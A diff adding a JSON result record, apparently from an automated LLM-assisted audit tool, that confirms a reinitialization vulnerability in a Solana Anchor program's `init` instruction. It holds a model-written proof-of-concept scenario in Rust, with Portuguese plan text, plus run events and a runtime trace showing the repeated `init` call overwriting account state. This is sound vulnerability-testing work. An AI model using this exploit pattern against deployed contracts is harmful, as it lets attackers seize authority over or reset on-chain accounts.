@@ -1,0 +1,68 @@
+{
+  "category": "REINIT",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: estado sobrescrito por reinit",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2005,
+        "completion_tokens": 600,
+        "latency_s": 3.47
+      },
+      "raw": "{\n  \"plan\": \"O programa-alvo é a instrução `init`, que grava `authority`, `is_initialized = true` e `vault_balance = 0` em uma conta `Config`. O baseline chama `init` legitimamente sobre uma conta `Config` já existente (criada com dados iniciais diferentes), provando que o cenário está montado. O ataque repete a mesma chamada sobre a conta já inicializada, tentando sobrescrever o estado. O efeito medido é que `is_initialized` continua verdadeiro e `vault_balance` foi sobrescrito para 0, ou que a autoridade foi alterada, demonstrando reinicialização.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet attacker = Pubkey::new_unique();\\n\\n// Conta Config já existente, com estado inicial diferente do que init gravaria.\\nlet config_data = anchor_account_data(\\n    \\\"Config\\\",\\n    &(attacker, true, 12345u64),\\n);\\nlet config_key = Pubkey::new_unique();\\nlet config_account = account(&env.program_id, &config_data, None);\\n\\nlet contas = vec![\\n    (config_key, config_account.clone()),\\n    (authority, wallet(1_000_000_000)),\\n];\\n\\nlet ix = env.anchor_ix(\\n    \\\"init\\\",\\n    &(),\\n    vec![\\n        AccountMeta::new(config_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\n\\n// Uso legítimo: init sobre a conta já existente (o programa não tem constraint de init).\\nlet baseline = env.baseline(\\\"init legitimo\\\", &ix, &contas);\\n\\n// Ataque: repetir init sobre a mesma conta já inicializada.\\nlet ataque = env.attack(\\\"reinit\\\", &ix, &contas);\\n\\nif ataque.program_result == ProgramResult::Success {\\n    let depois = after(&ataque, &config_key);\\n    let dados = depois.data();\\n    let authority_depois = read_pubkey(dados, 8);\\n    let is_init_depois = dados[40] != 0;\\n    let vault_depois = read_u64(dados, 41);\\n\\n    env.effect(\\n        \\\"estado sobrescrito por reinit\\\",\\n        authority_depois == authority && is_init_depois && vault_depois == 0,\\n    );\\n}\"\n}",
+      "plan": "O programa-alvo é a instrução `init`, que grava `authority`, `is_initialized = true` e `vault_balance = 0` em uma conta `Config`. O baseline chama `init` legitimamente sobre uma conta `Config` já existente (criada com dados iniciais diferentes), provando que o cenário está montado. O ataque repete a mesma chamada sobre a conta já inicializada, tentando sobrescrever o estado. O efeito medido é que `is_initialized` continua verdadeiro e `vault_balance` foi sobrescrito para 0, ou que a autoridade foi alterada, demonstrando reinicialização.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet attacker = Pubkey::new_unique();\n\n// Conta Config já existente, com estado inicial diferente do que init gravaria.\nlet config_data = anchor_account_data(\n    \"Config\",\n    &(attacker, true, 12345u64),\n);\nlet config_key = Pubkey::new_unique();\nlet config_account = account(&env.program_id, &config_data, None);\n\nlet contas = vec![\n    (config_key, config_account.clone()),\n    (authority, wallet(1_000_000_000)),\n];\n\nlet ix = env.anchor_ix(\n    \"init\",\n    &(),\n    vec![\n        AccountMeta::new(config_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\n\n// Uso legítimo: init sobre a conta já existente (o programa não tem constraint de init).\nlet baseline = env.baseline(\"init legitimo\", &ix, &contas);\n\n// Ataque: repetir init sobre a mesma conta já inicializada.\nlet ataque = env.attack(\"reinit\", &ix, &contas);\n\nif ataque.program_result == ProgramResult::Success {\n    let depois = after(&ataque, &config_key);\n    let dados = depois.data();\n    let authority_depois = read_pubkey(dados, 8);\n    let is_init_depois = dados[40] != 0;\n    let vault_depois = read_u64(dados, 41);\n\n    env.effect(\n        \"estado sobrescrito por reinit\",\n        authority_depois == authority && is_init_depois && vault_depois == 0,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "init legitimo",
+            "result": "Success",
+            "compute_units": 8658,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "attack",
+            "note": "reinit",
+            "result": "Success",
+            "compute_units": 8658,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "effect",
+            "note": "estado sobrescrito por reinit",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg invoke [1]",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg consumed 8658 of 1400000 compute units",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg success",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg invoke [1]",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg consumed 8658 of 1400000 compute units",
+          "Program 2P1GgtagVaYR8B6FhrPHdP4Mmy3pUFAZtSyeWFK293vg success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: estado sobrescrito por reinit"
+    }
+  ],
+  "case_id": "SSP-04-A-V",
+  "static_finding": {
+    "category": "REINIT",
+    "evidence": "",
+    "explanation": "",
+    "attack_hypothesis": "Verificar por execucao se a instrucao e vulneravel a Reinitialization Attacks."
+  }
+}
